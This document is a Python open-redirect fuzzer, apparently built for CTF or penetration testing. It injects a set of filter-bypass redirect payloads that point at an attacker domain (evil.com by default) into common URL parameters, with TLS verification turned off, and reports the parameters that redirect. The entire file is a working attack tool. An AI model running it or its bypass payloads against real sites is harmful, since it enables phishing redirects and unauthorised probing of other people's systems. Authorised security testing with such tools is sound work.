#!/usr/bin/env python3
"""
Open redirect fuzzer.
Tests URL parameters for open redirect vulnerabilities by injecting
various redirect payloads and checking response Location headers or
body redirects that resolve to an attacker-controlled domain.
Requires: requests
"""

import argparse
import sys
from urllib.parse import quote, urlparse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Common redirect parameter names ──────────────────────────────────────────

COMMON_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "redirectUrl", "redirecturi",
    "redirect_uri", "return", "returnUrl", "return_url", "returnTo",
    "next", "next_url", "continue", "goto", "url", "target", "dest",
    "destination", "ref", "referer", "redir", "location", "forward",
    "forward_url", "back", "backUrl", "out", "link", "navigate",
]

# ── Payload variants ──────────────────────────────────────────────────────────

def build_payloads(evil_domain: str) -> list[tuple[str, str]]:
    d = evil_domain
    return [
        (f"https://{d}",                          "plain https"),
        (f"http://{d}",                           "plain http"),
        (f"//{d}",                                "protocol-relative"),
        (f"////{d}",                              "quadruple-slash"),
        (f"https://{d}%2f@target.com",            "userinfo abuse"),
        (f"https://target.com@{d}",               "@ bypass"),
        (f"https://{d}?",                         "trailing ?"),
        (f"https://{d}#",                         "trailing #"),
        (f"https://{d}\\",                        "backslash"),
        (f"/%09//{d}",                            "tab character"),
        (f"/%2F%2F{d}",                           "double-encoded slash"),
        (f"/https://{d}",                         "prefix slash"),
        (f"https://{d}:80",                       "explicit port"),
        (f"https://{d}%00",                       "null byte suffix"),
        (quote(f"https://{d}", safe=""),          "URL-encoded"),
    ]


def make_session(headers: list[str]) -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0 (CTF-OpenRedirect)"
    for h in headers:
        k, _, v = h.partition(":")
        s.headers[k.strip()] = v.strip()
    return s


def send(session, url, param, value, method, base_data, timeout):
    try:
        if method == "GET":
            r = session.get(url, params={param: value}, timeout=timeout,
                            verify=False, allow_redirects=False)
        else:
            data = {**base_data, param: value}
            r = session.post(url, data=data, timeout=timeout, verify=False,
                             allow_redirects=False)
        return r
    except Exception:
        return None


def check_redirect(resp: requests.Response, evil_domain: str) -> bool:
    """Return True if the response redirects to the evil domain."""
    if resp.status_code not in (301, 302, 303, 307, 308):
        return False
    loc = resp.headers.get("Location", "")
    return evil_domain.lower() in loc.lower()


def check_meta_redirect(body: str, evil_domain: str) -> bool:
    return evil_domain.lower() in body.lower() and (
        "meta" in body.lower() and "refresh" in body.lower()
    )


def fuzz_param(session, url, method, param, payloads, base_data, timeout, evil_domain):
    hits = []
    for value, label in payloads:
        r = send(session, url, param, value, method, base_data, timeout)
        if r is None:
            continue
        if check_redirect(r, evil_domain):
            loc = r.headers.get("Location", "")
            print(f"  [+] OPEN REDIRECT  param={param!r}  label={label!r}")
            print(f"      Payload: {value!r}")
            print(f"      Location: {loc}")
            print(f"      Status: {r.status_code}\n")
            hits.append({"param": param, "value": value, "label": label,
                         "location": loc})
        elif check_meta_redirect(r.text, evil_domain):
            print(f"  [~] META REFRESH redirect  param={param!r}  label={label!r}")
        else:
            pass  # silent on miss
    return hits


def main():
    parser = argparse.ArgumentParser(description="Open redirect fuzzer")
    parser.add_argument("--url",    required=True, help="Target URL")
    parser.add_argument("--evil",   default="evil.com",
                        help="Attacker domain to redirect to (default: evil.com)")
    parser.add_argument("--param",  action="append", default=[], dest="params",
                        metavar="NAME",
                        help="Parameter(s) to test (if omitted, tests common list)")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",   default="", help="Base POST data (key=val&...)")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--headers", action="append", default=[], metavar="H:V")
    args = parser.parse_args()

    session   = make_session(args.headers)
    base_data = {}
    if args.data:
        for part in args.data.split("&"):
            k, _, v = part.partition("=")
            base_data[k] = v

    params   = args.params if args.params else COMMON_PARAMS
    payloads = build_payloads(args.evil)

    print(f"[*] Target: {args.url}")
    print(f"[*] Evil domain: {args.evil}")
    print(f"[*] Testing {len(params)} param(s) x {len(payloads)} payloads\n")

    all_hits = []
    for param in params:
        hits = fuzz_param(session, args.url, args.method, param,
                          payloads, base_data, args.timeout, args.evil)
        all_hits += hits

    if all_hits:
        print(f"[+] {len(all_hits)} open redirect(s) found:")
        for h in all_hits:
            print(f"    {h['param']}={h['value']!r}  -> {h['location']}")
    else:
        print("[-] No open redirects detected")


if __name__ == "__main__":
    main()
